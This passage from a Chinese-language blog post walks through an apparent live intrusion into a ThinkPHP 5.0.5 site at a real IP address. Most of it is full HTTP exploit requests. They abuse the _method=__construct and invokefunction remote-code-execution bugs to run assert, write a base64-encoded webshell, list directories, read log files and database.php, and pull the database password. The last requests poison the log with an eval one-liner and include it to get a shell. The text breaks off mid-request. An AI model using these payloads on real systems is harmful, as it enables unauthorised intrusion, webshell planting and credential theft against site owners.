punctuation">,</span>ini_restore<span class="token punctuation">,</span>dl<span class="token punctuation">,</span>openlog<span class="token punctuation">,</span>syslog<span class="token punctuation">,</span>readlink<span class="token punctuation">,</span>symlink<span class="token punctuation">,</span>popepassthru<span class="token punctuation">,</span>pcntl_alarm<span class="token punctuation">,</span>pcntl_fork<span class="token punctuation">,</span>pcntl_waitpid<span class="token punctuation">,</span>pcntl_wait<span class="token punctuation">,</span>pcntl_wifexited<span class="token punctuation">,</span>pcntl_wifstopped<span class="token punctuation">,</span>pcntl_wifsignaled<span class="token punctuation">,</span>pcntl_wifcontinued<span class="token punctuation">,</span>pcntl_wexitstatus<span class="token punctuation">,</span>pcntl_wtermsig<span class="token punctuation">,</span>pcntl_wstopsig<span class="token punctuation">,</span>pcntl_signal<span class="token punctuation">,</span>pcntl_signal_dispatch<span class="token punctuation">,</span>pcntl_get_last_error<span class="token punctuation">,</span>pcntl_strerror<span class="token punctuation">,</span>pcntl_sigprocmask<span class="token punctuation">,</span>pcntl_sigwaitinfo<span class="token punctuation">,</span>pcntl_sigtimedwait<span class="token punctuation">,</span>pcntl_exec<span class="token punctuation">,</span>pcntl_getpriority<span class="token punctuation">,</span>pcntl_setpriority<span class="token punctuation">,</span>imap_open<span class="token punctuation">,</span>apache_setenv</code></pre><h2 id="一-代码执行getshell"><a href="#一-代码执行getshell" class="headerlink" title="一:代码执行getshell"></a>一:代码执行getshell</h2><p>因为php版本是 7.0以下所以可以使用assert 执行phpinfo</p><pre class="language-java" data-language="java"><code class="language-java">POST <span class="token operator">/</span>index<span class="token punctuation">.</span>php<span class="token operator">?</span>s<span class="token operator">=</span>index HTTP<span class="token operator">/</span><span class="token number">1.1</span><span class="token class-name">Host</span><span class="token operator">:</span> <span class="token number">103.106</span><span class="token number">.188</span><span class="token number">.58</span><span class="token class-name">Cache</span><span class="token operator">-</span><span class="token class-name">Control</span><span class="token operator">:</span> max<span class="token operator">-</span>age<span class="token operator">=</span><span class="token number">0</span><span class="token class-name">Upgrade</span><span class="token operator">-</span><span class="token class-name">Insecure</span><span class="token operator">-</span><span class="token class-name">Requests</span><span class="token operator">:</span> <span class="token number">1</span><span class="token class-name">User</span><span class="token operator">-</span><span class="token class-name">Agent</span><span class="token operator">:</span> <span class="token class-name">Mozilla</span><span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span><span class="token class-name">Windows</span> NT <span class="token number">10.0</span><span class="token punctuation">;</span> <span class="token class-name">Win64</span><span class="token punctuation">;</span> x64<span class="token punctuation">)</span> <span class="token class-name">AppleWebKit</span><span class="token operator">/</span><span class="token number">537.36</span> <span class="token punctuation">(</span>KHTML<span class="token punctuation">,</span> like <span class="token class-name">Gecko</span><span class="token punctuation">)</span> <span class="token class-name">Chrome</span><span class="token operator">/</span><span class="token number">122.0</span><span class="token number">.6261</span><span class="token number">.95</span> <span class="token class-name">Safari</span><span class="token operator">/</span><span class="token number">537.36</span><span class="token class-name">Accept</span><span class="token operator">:</span> text<span class="token operator">/</span>html<span class="token punctuation">,</span>application<span class="token operator">/</span>xhtml<span class="token operator">+</span>xml<span class="token punctuation">,</span>application<span class="token operator">/</span>xml<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span><span class="token punctuation">,</span>image<span class="token operator">/</span>avif<span class="token punctuation">,</span>image<span class="token operator">/</span>webp<span class="token punctuation">,</span>image<span class="token operator">/</span>apng<span class="token punctuation">,</span><span class="token operator">*</span><span class="token comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=bckbfn53ss1cgm1crhs1pirft7; think_var=zh-cnConnection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 62_method=__construct&amp;filter[]=assert&amp;method=get&amp;get[]=phpinfo()</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202407271415040.png" alt="assert执行代码"><br>写文件函数,直接拿下webshell</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Host</span><span class="token operator">:</span> <span class="token number">103.106</span><span class="token number">.188</span><span class="token number">.58</span><span class="token class-name">Cache</span><span class="token operator">-</span><span class="token class-name">Control</span><span class="token operator">:</span> max<span class="token operator">-</span>age<span class="token operator">=</span><span class="token number">0</span><span class="token class-name">Upgrade</span><span class="token operator">-</span><span class="token class-name">Insecure</span><span class="token operator">-</span><span class="token class-name">Requests</span><span class="token operator">:</span> <span class="token number">1</span><span class="token class-name">User</span><span class="token operator">-</span><span class="token class-name">Agent</span><span class="token operator">:</span> <span class="token class-name">Mozilla</span><span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span><span class="token class-name">Windows</span> NT <span class="token number">10.0</span><span class="token punctuation">;</span> <span class="token class-name">Win64</span><span class="token punctuation">;</span> x64<span class="token punctuation">)</span> <span class="token class-name">AppleWebKit</span><span class="token operator">/</span><span class="token number">537.36</span> <span class="token punctuation">(</span>KHTML<span class="token punctuation">,</span> like <span class="token class-name">Gecko</span><span class="token punctuation">)</span> <span class="token class-name">Chrome</span><span class="token operator">/</span><span class="token number">122.0</span><span class="token number">.6261</span><span class="token number">.95</span> <span class="token class-name">Safari</span><span class="token operator">/</span><span class="token number">537.36</span><span class="token class-name">Accept</span><span class="token operator">:</span> text<span class="token operator">/</span>html<span class="token punctuation">,</span>application<span class="token operator">/</span>xhtml<span class="token operator">+</span>xml<span class="token punctuation">,</span>application<span class="token operator">/</span>xml<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span><span class="token punctuation">,</span>image<span class="token operator">/</span>avif<span class="token punctuation">,</span>image<span class="token operator">/</span>webp<span class="token punctuation">,</span>image<span class="token operator">/</span>apng<span class="token punctuation">,</span><span class="token operator">*</span><span class="token comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=bckbfn53ss1cgm1crhs1pirft7; think_var=zh-cnConnection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 903_method=__construct&amp;filter[]=assert&amp;method=get&amp;get[]=@file_put_contents(base64_decode(MzMzMy5waHA=),base64_decode("YWZhZHNmZHM8P3BocCBwaHBpbmZvKCk7Pz5hZmRzZmRzZg=="));返回:   &lt;div class="info">                &lt;div>                    &lt;h2>[8] &lt;abbr title="think\exception\ErrorException">ErrorException&lt;/abbr> in &lt;a class="toggle" title="/www/wwwroot/s.ios0.top/thinkphp/library/think/Request.php(1040) : assert code line 1">Request.php(1040) : assert code line 1&lt;/a>&lt;/h2>                &lt;/div>                &lt;div>&lt;h1>Use of undefined constant __construct - assumed '__construct'&lt;/h1>&lt;/div>            &lt;/div>            &lt;/div></span></code></pre><p>注意有些根目录不可写通过这种方式可能拿不到shell。所以可以写到别的文件夹里面。如果遇到可以尝试一下。后续我遇到的话会补充一波如何写到别的文件夹里面。<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202407271420885.png" alt="写文件直接拿下"><br>另外代码执行还有一种打法</p><pre class="language-java" data-language="java"><code class="language-java">POST <span class="token comment">//index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=assert&amp;vars[1][]=@file_put_contents(base64_decode(MzMzMy5waHA=),base64_decode("YWZhZHNmZHM8P3BocCBwaHBpbmZvKCk7Pz5hZmRzZmRzZg==")) HTTP/1.1</span><span class="token class-name">Host</span><span class="token operator">:</span> <span class="token number">103.106</span><span class="token number">.188</span><span class="token number">.58</span><span class="token class-name">Cache</span><span class="token operator">-</span><span class="token class-name">Control</span><span class="token operator">:</span> max<span class="token operator">-</span>age<span class="token operator">=</span><span class="token number">0</span><span class="token class-name">Upgrade</span><span class="token operator">-</span><span class="token class-name">Insecure</span><span class="token operator">-</span><span class="token class-name">Requests</span><span class="token operator">:</span> <span class="token number">1</span><span class="token class-name">User</span><span class="token operator">-</span><span class="token class-name">Agent</span><span class="token operator">:</span> <span class="token class-name">Mozilla</span><span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span><span class="token class-name">Windows</span> NT <span class="token number">10.0</span><span class="token punctuation">;</span> <span class="token class-name">Win64</span><span class="token punctuation">;</span> x64<span class="token punctuation">)</span> <span class="token class-name">AppleWebKit</span><span class="token operator">/</span><span class="token number">537.36</span> <span class="token punctuation">(</span>KHTML<span class="token punctuation">,</span> like <span class="token class-name">Gecko</span><span class="token punctuation">)</span> <span class="token class-name">Chrome</span><span class="token operator">/</span><span class="token number">122.0</span><span class="token number">.6261</span><span class="token number">.95</span> <span class="token class-name">Safari</span><span class="token operator">/</span><span class="token number">537.36</span><span class="token class-name">Accept</span><span class="token operator">:</span> text<span class="token operator">/</span>html<span class="token punctuation">,</span>application<span class="token operator">/</span>xhtml<span class="token operator">+</span>xml<span class="token punctuation">,</span>application<span class="token operator">/</span>xml<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span><span class="token punctuation">,</span>image<span class="token operator">/</span>avif<span class="token punctuation">,</span>image<span class="token operator">/</span>webp<span class="token punctuation">,</span>image<span class="token operator">/</span>apng<span class="token punctuation">,</span><span class="token operator">*</span><span class="token comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=bckbfn53ss1cgm1crhs1pirft7; think_var=zh-cnConnection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 0</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202407271423551.png" alt="直接拿下"><br>可以看到成功拿下webshell。上述打法是针对可以执行代码的那么无法执行代码的如何打。冰蝎连接<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202407271426322.png" alt="冰蝎连接"><br>对了上述目标是 thinkphp框架的版本是 5.0.5 。我们假如这个网站不可以执行代码我们如何打。</p><h2 id="二-日志方式打"><a href="#二-日志方式打" class="headerlink" title="二:日志方式打"></a>二:日志方式打</h2><p>  对于日志方式我们先得找到日志在哪里存着,遍历目录寻找日志日志.</p>  <pre class="language-java" data-language="java"><code class="language-java">POST <span class="token operator">/</span>index<span class="token punctuation">.</span>php<span class="token operator">?</span>s<span class="token operator">=</span>index HTTP<span class="token operator">/</span><span class="token number">1.1</span><span class="token class-name">Host</span><span class="token operator">:</span> <span class="token number">103.106</span><span class="token number">.188</span><span class="token number">.58</span><span class="token class-name">Cache</span><span class="token operator">-</span><span class="token class-name">Control</span><span class="token operator">:</span> max<span class="token operator">-</span>age<span class="token operator">=</span><span class="token number">0</span><span class="token class-name">Upgrade</span><span class="token operator">-</span><span class="token class-name">Insecure</span><span class="token operator">-</span><span class="token class-name">Requests</span><span class="token operator">:</span> <span class="token number">1</span><span class="token class-name">User</span><span class="token operator">-</span><span class="token class-name">Agent</span><span class="token operator">:</span> <span class="token class-name">Mozilla</span><span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span><span class="token class-name">Windows</span> NT <span class="token number">10.0</span><span class="token punctuation">;</span> <span class="token class-name">Win64</span><span class="token punctuation">;</span> x64<span class="token punctuation">)</span> <span class="token class-name">AppleWebKit</span><span class="token operator">/</span><span class="token number">537.36</span> <span class="token punctuation">(</span>KHTML<span class="token punctuation">,</span> like <span class="token class-name">Gecko</span><span class="token punctuation">)</span> <span class="token class-name">Chrome</span><span class="token operator">/</span><span class="token number">122.0</span><span class="token number">.6261</span><span class="token number">.95</span> <span class="token class-name">Safari</span><span class="token operator">/</span><span class="token number">537.36</span><span class="token class-name">Accept</span><span class="token operator">:</span> text<span class="token operator">/</span>html<span class="token punctuation">,</span>application<span class="token operator">/</span>xhtml<span class="token operator">+</span>xml<span class="token punctuation">,</span>application<span class="token operator">/</span>xml<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span><span class="token punctuation">,</span>image<span class="token operator">/</span>avif<span class="token punctuation">,</span>image<span class="token operator">/</span>webp<span class="token punctuation">,</span>image<span class="token operator">/</span>apng<span class="token punctuation">,</span><span class="token operator">*</span><span class="token comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=bckbfn53ss1cgm1crhs1pirft7; think_var=zh-cnConnection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 75_method=__construct&amp;filter[]=scandir&amp;&amp;filter[]=var_dump&amp;method=GET&amp;get[]=./</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202407271434575.png" alt="遍历目录查找日志文件位置"><br>我们格式化一下查看<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202407271437009.png" alt="格式化查看"><br>熟悉thinkphp框架的都知道我们的日志文件一般在runtime目录下面我们以此遍历日志位置是.&#x2F;runtime&#x2F;log&#x2F;202406&#x2F;15.log<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202407271439294.png" alt="日志文件位置"><br>我们看一下日志文件里面的内容</p><pre class="language-java" data-language="java"><code class="language-java">POST <span class="token operator">/</span>index<span class="token punctuation">.</span>php<span class="token operator">?</span>s<span class="token operator">=</span>index HTTP<span class="token operator">/</span><span class="token number">1.1</span><span class="token class-name">Host</span><span class="token operator">:</span> <span class="token number">103.106</span><span class="token number">.188</span><span class="token number">.58</span><span class="token class-name">Cache</span><span class="token operator">-</span><span class="token class-name">Control</span><span class="token operator">:</span> max<span class="token operator">-</span>age<span class="token operator">=</span><span class="token number">0</span><span class="token class-name">Upgrade</span><span class="token operator">-</span><span class="token class-name">Insecure</span><span class="token operator">-</span><span class="token class-name">Requests</span><span class="token operator">:</span> <span class="token number">1</span><span class="token class-name">User</span><span class="token operator">-</span><span class="token class-name">Agent</span><span class="token operator">:</span> <span class="token class-name">Mozilla</span><span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span><span class="token class-name">Windows</span> NT <span class="token number">10.0</span><span class="token punctuation">;</span> <span class="token class-name">Win64</span><span class="token punctuation">;</span> x64<span class="token punctuation">)</span> <span class="token class-name">AppleWebKit</span><span class="token operator">/</span><span class="token number">537.36</span> <span class="token punctuation">(</span>KHTML<span class="token punctuation">,</span> like <span class="token class-name">Gecko</span><span class="token punctuation">)</span> <span class="token class-name">Chrome</span><span class="token operator">/</span><span class="token number">122.0</span><span class="token number">.6261</span><span class="token number">.95</span> <span class="token class-name">Safari</span><span class="token operator">/</span><span class="token number">537.36</span><span class="token class-name">Accept</span><span class="token operator">:</span> text<span class="token operator">/</span>html<span class="token punctuation">,</span>application<span class="token operator">/</span>xhtml<span class="token operator">+</span>xml<span class="token punctuation">,</span>application<span class="token operator">/</span>xml<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span><span class="token punctuation">,</span>image<span class="token operator">/</span>avif<span class="token punctuation">,</span>image<span class="token operator">/</span>webp<span class="token punctuation">,</span>image<span class="token operator">/</span>apng<span class="token punctuation">,</span><span class="token operator">*</span><span class="token comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=bckbfn53ss1cgm1crhs1pirft7; think_var=zh-cnConnection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 88_method=__construct&amp;filter[]=highlight_file&amp;method=GET&amp;get[]=./runtime/log/202406/15.log</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202407271443131.png" alt="查看日志文件内容"><br>当然我们也可以读取数据库文件</p><pre class="language-java" data-language="java"><code class="language-java">POST <span class="token operator">/</span>index<span class="token punctuation">.</span>php<span class="token operator">?</span>s<span class="token operator">=</span>index HTTP<span class="token operator">/</span><span class="token number">1.1</span><span class="token class-name">Host</span><span class="token operator">:</span> <span class="token number">103.106</span><span class="token number">.188</span><span class="token number">.58</span><span class="token class-name">Cache</span><span class="token operator">-</span><span class="token class-name">Control</span><span class="token operator">:</span> max<span class="token operator">-</span>age<span class="token operator">=</span><span class="token number">0</span><span class="token class-name">Upgrade</span><span class="token operator">-</span><span class="token class-name">Insecure</span><span class="token operator">-</span><span class="token class-name">Requests</span><span class="token operator">:</span> <span class="token number">1</span><span class="token class-name">User</span><span class="token operator">-</span><span class="token class-name">Agent</span><span class="token operator">:</span> <span class="token class-name">Mozilla</span><span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span><span class="token class-name">Windows</span> NT <span class="token number">10.0</span><span class="token punctuation">;</span> <span class="token class-name">Win64</span><span class="token punctuation">;</span> x64<span class="token punctuation">)</span> <span class="token class-name">AppleWebKit</span><span class="token operator">/</span><span class="token number">537.36</span> <span class="token punctuation">(</span>KHTML<span class="token punctuation">,</span> like <span class="token class-name">Gecko</span><span class="token punctuation">)</span> <span class="token class-name">Chrome</span><span class="token operator">/</span><span class="token number">122.0</span><span class="token number">.6261</span><span class="token number">.95</span> <span class="token class-name">Safari</span><span class="token operator">/</span><span class="token number">537.36</span><span class="token class-name">Accept</span><span class="token operator">:</span> text<span class="token operator">/</span>html<span class="token punctuation">,</span>application<span class="token operator">/</span>xhtml<span class="token operator">+</span>xml<span class="token punctuation">,</span>application<span class="token operator">/</span>xml<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span><span class="token punctuation">,</span>image<span class="token operator">/</span>avif<span class="token punctuation">,</span>image<span class="token operator">/</span>webp<span class="token punctuation">,</span>image<span class="token operator">/</span>apng<span class="token punctuation">,</span><span class="token operator">*</span><span class="token comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=bckbfn53ss1cgm1crhs1pirft7; think_var=zh-cnConnection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 87_method=__construct&amp;filter[]=highlight_file&amp;method=GET&amp;get[]=./application/database.php</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202407271446843.png" alt="查看数据库文件内容"><br>当然我们可以用另外一种方式读取数据库,查看数据密码</p><pre class="language-java" data-language="java"><code class="language-java">POST <span class="token operator">/</span><span class="token operator">?</span>s<span class="token operator">=</span>index<span class="token operator">/</span>think\config<span class="token operator">/</span>get<span class="token operator">&amp;</span>name<span class="token operator">=</span>database<span class="token punctuation">.</span>password  HTTP<span class="token operator">/</span><span class="token number">1.1</span><span class="token class-name">Host</span><span class="token operator">:</span> <span class="token number">103.106</span><span class="token number">.188</span><span class="token number">.58</span><span class="token class-name">Cache</span><span class="token operator">-</span><span class="token class-name">Control</span><span class="token operator">:</span> max<span class="token operator">-</span>age<span class="token operator">=</span><span class="token number">0</span><span class="token class-name">Upgrade</span><span class="token operator">-</span><span class="token class-name">Insecure</span><span class="token operator">-</span><span class="token class-name">Requests</span><span class="token operator">:</span> <span class="token number">1</span><span class="token class-name">User</span><span class="token operator">-</span><span class="token class-name">Agent</span><span class="token operator">:</span> <span class="token class-name">Mozilla</span><span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span><span class="token class-name">Windows</span> NT <span class="token number">10.0</span><span class="token punctuation">;</span> <span class="token class-name">Win64</span><span class="token punctuation">;</span> x64<span class="token punctuation">)</span> <span class="token class-name">AppleWebKit</span><span class="token operator">/</span><span class="token number">537.36</span> <span class="token punctuation">(</span>KHTML<span class="token punctuation">,</span> like <span class="token class-name">Gecko</span><span class="token punctuation">)</span> <span class="token class-name">Chrome</span><span class="token operator">/</span><span class="token number">122.0</span><span class="token number">.6261</span><span class="token number">.95</span> <span class="token class-name">Safari</span><span class="token operator">/</span><span class="token number">537.36</span><span class="token class-name">Accept</span><span class="token operator">:</span> text<span class="token operator">/</span>html<span class="token punctuation">,</span>application<span class="token operator">/</span>xhtml<span class="token operator">+</span>xml<span class="token punctuation">,</span>application<span class="token operator">/</span>xml<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span><span class="token punctuation">,</span>image<span class="token operator">/</span>avif<span class="token punctuation">,</span>image<span class="token operator">/</span>webp<span class="token punctuation">,</span>image<span class="token operator">/</span>apng<span class="token punctuation">,</span><span class="token operator">*</span><span class="token comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=bckbfn53ss1cgm1crhs1pirft7; think_var=zh-cnConnection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 0</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202407271448665.png" alt="查看数据库用户名"><br>我们回归正题既然我们已经拿到了日志路径是不是想起了thinkphp包含getshell对就是他。测试是否正常包含</p><pre class="language-java" data-language="java"><code class="language-java">POST <span class="token operator">/</span>index<span class="token punctuation">.</span>php<span class="token operator">?</span>s<span class="token operator">=</span>index HTTP<span class="token operator">/</span><span class="token number">1.1</span><span class="token class-name">Host</span><span class="token operator">:</span> <span class="token number">103.106</span><span class="token number">.188</span><span class="token number">.58</span><span class="token class-name">Cache</span><span class="token operator">-</span><span class="token class-name">Control</span><span class="token operator">:</span> max<span class="token operator">-</span>age<span class="token operator">=</span><span class="token number">0</span><span class="token class-name">Upgrade</span><span class="token operator">-</span><span class="token class-name">Insecure</span><span class="token operator">-</span><span class="token class-name">Requests</span><span class="token operator">:</span> <span class="token number">1</span><span class="token class-name">User</span><span class="token operator">-</span><span class="token class-name">Agent</span><span class="token operator">:</span> <span class="token class-name">Mozilla</span><span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span><span class="token class-name">Windows</span> NT <span class="token number">10.0</span><span class="token punctuation">;</span> <span class="token class-name">Win64</span><span class="token punctuation">;</span> x64<span class="token punctuation">)</span> <span class="token class-name">AppleWebKit</span><span class="token operator">/</span><span class="token number">537.36</span> <span class="token punctuation">(</span>KHTML<span class="token punctuation">,</span> like <span class="token class-name">Gecko</span><span class="token punctuation">)</span> <span class="token class-name">Chrome</span><span class="token operator">/</span><span class="token number">122.0</span><span class="token number">.6261</span><span class="token number">.95</span> <span class="token class-name">Safari</span><span class="token operator">/</span><span class="token number">537.36</span><span class="token class-name">Accept</span><span class="token operator">:</span> text<span class="token operator">/</span>html<span class="token punctuation">,</span>application<span class="token operator">/</span>xhtml<span class="token operator">+</span>xml<span class="token punctuation">,</span>application<span class="token operator">/</span>xml<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span><span class="token punctuation">,</span>image<span class="token operator">/</span>avif<span class="token punctuation">,</span>image<span class="token operator">/</span>webp<span class="token punctuation">,</span>image<span class="token operator">/</span>apng<span class="token punctuation">,</span><span class="token operator">*</span><span class="token comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=bckbfn53ss1cgm1crhs1pirft7; think_var=zh-cnConnection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 106_method=__construct&amp;method=get&amp;filter[]=think\__include_file&amp;server[]=-1&amp;get[]=./runtime/log/202406/15.log</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202407271451027.png" alt="测试是否正常包含文件"><br>报错记录日志</p><pre class="language-java" data-language="java"><code class="language-java">POST <span class="token operator">/</span>index<span class="token punctuation">.</span>php<span class="token operator">?</span>s<span class="token operator">=</span>index HTTP<span class="token operator">/</span><span class="token number">1.1</span><span class="token class-name">Host</span><span class="token operator">:</span> <span class="token number">103.106</span><span class="token number">.188</span><span class="token number">.58</span><span class="token class-name">Cache</span><span class="token operator">-</span><span class="token class-name">Control</span><span class="token operator">:</span> max<span class="token operator">-</span>age<span class="token operator">=</span><span class="token number">0</span><span class="token class-name">Upgrade</span><span class="token operator">-</span><span class="token class-name">Insecure</span><span class="token operator">-</span><span class="token class-name">Requests</span><span class="token operator">:</span> <span class="token number">1</span><span class="token class-name">User</span><span class="token operator">-</span><span class="token class-name">Agent</span><span class="token operator">:</span> <span class="token class-name">Mozilla</span><span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span><span class="token class-name">Windows</span> NT <span class="token number">10.0</span><span class="token punctuation">;</span> <span class="token class-name">Win64</span><span class="token punctuation">;</span> x64<span class="token punctuation">)</span> <span class="token class-name">AppleWebKit</span><span class="token operator">/</span><span class="token number">537.36</span> <span class="token punctuation">(</span>KHTML<span class="token punctuation">,</span> like <span class="token class-name">Gecko</span><span class="token punctuation">)</span> <span class="token class-name">Chrome</span><span class="token operator">/</span><span class="token number">122.0</span><span class="token number">.6261</span><span class="token number">.95</span> <span class="token class-name">Safari</span><span class="token operator">/</span><span class="token number">537.36</span><span class="token class-name">Accept</span><span class="token operator">:</span> text<span class="token operator">/</span>html<span class="token punctuation">,</span>application<span class="token operator">/</span>xhtml<span class="token operator">+</span>xml<span class="token punctuation">,</span>application<span class="token operator">/</span>xml<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span><span class="token punctuation">,</span>image<span class="token operator">/</span>avif<span class="token punctuation">,</span>image<span class="token operator">/</span>webp<span class="token punctuation">,</span>image<span class="token operator">/</span>apng<span class="token punctuation">,</span><span class="token operator">*</span><span class="token comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=bckbfn53ss1cgm1crhs1pirft7; think_var=zh-cnConnection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 79_method=__construct&lt;?php $a=strtoupper('$_post["x"]');eval("eval($a);")?>ssssss</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202407271454125.png" alt="报错记录日志"><br>我们下载日志看看是否记录。下载查看日志看看。如果下载的日志没有那么多报错几次他就有了<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202407271456461.png" alt="记录了我们的恶意文件"><br>接下来我们包含一波。</p><pre class="language-java" data-language="java"><code class="language-java">POST <span class="token operator">/</span>index<span class="token punctuation">.</span>php<span class="token operator">?</span>s<span class="token operator">=</span>index HTTP<span class="token operator">/</span><span class="token number">1.1</span><span class="token class-name">Host</span><span class="token operator">:</span> <span class="token number">103.106</span><span class="token number">.188</span><span class="token number">.58</span><span class="token class-name">Cache</span><span class="token operator">-</span><span class="token class-name">Control</span><span class="token operator">:</span> max<span class="token operator">-</span>age<span class="token operator">=</span><span class="token number">0</span><span class="token class-name">Upgrade</span><span class="token operator">-</span><span class="token class-name">Insecure</span><span class="token operator">-</span><span class="token class-name">Requests</span><span class="token operator">:</span> <span class="token number">1</span><span class="token class-name">User</span><span class="token operator">-</span><span class="token class-name">Agent</span><span class="token operator">:</span> <span class="token class-name">Mozilla</span><span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span><span class="token class-name">Windows</span> NT <span class="token number">10.0</span><span class="token punctuation">;</span> <span class="token class-name">Win64</span><span class="token punctuation">;</span> x64<span class="token punctuation">)</span> <span class="token class-name">AppleWebKit</span><span class="token operator">/</span><span class="token number">537.36</span> <span class="token punctuation">(</span>KHTML<span class="token punctuation">,</span> like <span class="token class-name">Gecko</span><span class="token punctuation">)</span> <span class="token class-name">Chrome</span><span class="token operator">/</span><span class="token number">122.0</span><span class="token number">.6261</span><span class="token number">.95</span> <span class="token class-name">Safari</span><span class="token operator">/</span><span class="token number">537.36</span><span class="token class-name">Accept</span><span class="token operator">:</span> text<span class="token operator">/</span>html<span class="token punctuation">,</span>application<span class="token operator">/</span>xhtml<span class="token operator">+</span>xml<span class="token punctuation">,</span>application<span class="token operator">/</span>xml<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span><span class="token punctuation">,</span>image<span class="token operator">/</span>avif<span class="token punctuation">,</span>image<span class="token operator">/</span>webp<span class="token punctuation">,</span>image<span class="token operator">/</span>apng<span class="token punctuation">,</span><span class="token operator">*</span><span class="token comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=bckbfn53ss1cgm1crhs1pirft7; think_var=zh-cnConnection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 94_method=__construct&amp;filter[]=think\__include_file&amp;method=GET&amp;get[]=./runtime/log/202406/15.log</span></code></pre><p>写一句话</p><pre class="language-java" data-language="java"><code class="language-java">POST <span class="token operator">/</span>index<span class="token punctuation">.</span>php<span class="token operator">?</span>s<span class="token operator">=</span>index HTTP<span class="token operator">/</span><span class="token number">1.1</span><span class="token class-name">Host</span><span class="token operator">:</span> <span class="token number">103.106</span><span class="token number">.188</span><span class="token number">.58</span><span class="token class-name">Cache</span><span class="token operator">-</span><span class="token class-name">Control</span><span class="token operator">:</span> max<span class="token operator">-</span>age<span class="token operator">=</span><span class="token number">0</span><span class="token class-name">Upgrade</span><span class="token operator">-</span><span class="token class-name">Insecure</span><span class="token operator">-</span><span class="token class-name">Requests</span><span class="token operator">:</span> <span class="token number">1</span><span class="token class-name">User</span><span class="token operator">-</span><span class="token class-name">Agent</span><span class="token operator">:</span> <span class="token class-name">Mozilla</span><span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span><span class="token class-name">Windows</span> NT <span class="token number">10.0</span><span class="token punctuation">;</span> <span class="token class-name">Win64</span><span class="token punctuation">;</span> x64<span class="token punctuation">)</span> <span class="token class-name">AppleWebKit</span><span class="token operator">/</span><span class="token number">537.36</span> <span class="token punctuation">(</span>KHTML<span 